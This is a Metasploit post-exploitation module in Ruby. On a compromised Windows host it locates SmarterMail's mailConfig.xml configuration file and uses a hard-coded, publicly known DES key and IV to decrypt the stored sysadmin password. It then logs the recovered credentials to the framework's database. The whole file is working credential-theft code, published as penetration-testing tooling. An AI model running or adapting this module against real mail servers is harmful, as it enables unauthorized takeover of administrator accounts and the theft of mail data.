##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather SmarterMail Password Extraction',
        'Description' => %q{
          This module extracts and decrypts the sysadmin password in the
          SmarterMail 'mailConfig.xml' configuration file. The encryption
          key and IV are publicly known.

          This module has been tested successfully on SmarterMail versions
          10.7.4842 and 11.7.5136.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Joe Giron', # Discovery and PoC (@theonlyevil1)
          'bcoles', # Metasploit
          'sinn3r' # shell session support
        ],
        'References' => [
          ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  #
  # Decrypt DES encrypted password string
  #
  def decrypt_des(encrypted)
    return nil if encrypted.nil?

    decipher = OpenSSL::Cipher.new('DES')
    decipher.decrypt
    decipher.key = "\xb9\x9a\x52\xd4\x58\x77\xe9\x18"
    decipher.iv = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
    decipher.update(encrypted) + decipher.final
  end

  def bound_port(data)
    port = nil

    begin
      port = JSON.parse(data)['BoundPort']
    rescue JSON::ParserError => e
      elog('Unable to parse BoundPort', error: e)
      return nil
    end

    port
  end

  def system_drive
    @system_drive ||= expand_path('%SystemDrive%').strip
  end

  def web_server_port
    ['Program Files (x86)', 'Program Files'].each do |program_dir|
      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json).strip
      if file?(path)
        data = read_file(path)
        return bound_port(data)
      end
    end

    return nil
  end

  #
  # Find SmarterMail 'mailConfig.xml' config file
  #
  def mail_config_path
    found_path = ''

    ['Program Files (x86)', 'Program Files'].each do |program_dir|
      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml).strip
      vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
      if file?(path)
        found_path = path
        break
      end
    end

    found_path
  end

  #
  # Retrieve username and decrypt encrypted password string from the config file
  #
  def get_smartermail_creds(path)
    result = {}
    data = ''

    vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
    begin
      data = read_file(path)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "#{peer} - Failed to download #{path} - #{e}"
      return result
    end

    if data.blank?
      print_error "#{peer} - Configuration file is empty."
      return result
    end

    username = data.match(%r{<sysAdminUserName>(.+)</sysAdminUserName>})
    password = data.scan(%r{<(sysAdminPassword|sysAdminPasswordHash)>(.+)</(sysAdminPassword|sysAdminPasswordHash)>}).flatten[1]

    result[:username] = username[1] unless username.nil?

    if password
      begin
        result[:password] = decrypt_des(Rex::Text.decode_base64(password))
        result[:private_type] = :password
      rescue OpenSSL::Cipher::CipherError
        result[:password] = password
        result[:private_type] = :nonreplayable_hash
        result[:jtr_format] = 'des'
      end
    end

    result
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      post_reference_name: refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: opts[:private_type],
      username: opts[:user]
    }

    if opts[:private_type] == :nonreplayable_hash
      credential_data.merge!(jtr_format: opts[:jtr_format])
    end

    credential_data.merge!(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Find the config file, extract the encrypted password and decrypt it
  #
  def run
    # check for SmartMail config file
    config_path = mail_config_path
    if config_path.blank?
      print_error "#{peer} - Could not find SmarterMail config file"
      return
    end

    # retrieve username and decrypted password from config file
    result = get_smartermail_creds(config_path)
    if result[:password].nil?
      print_error "#{peer} - Could not decrypt password string"
      return
    end

    # report result
    port = web_server_port || 9998 # Default is 9998
    user = result[:username]
    pass = result[:password]
    type = result[:private_type]
    format = result[:jtr_format]
    print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"

    report_cred(
      ip: rhost,
      port: port,
      service_name: 'http',
      user: user,
      password: pass,
      private_type: type,
      jtr_format: format
    )
  end
end
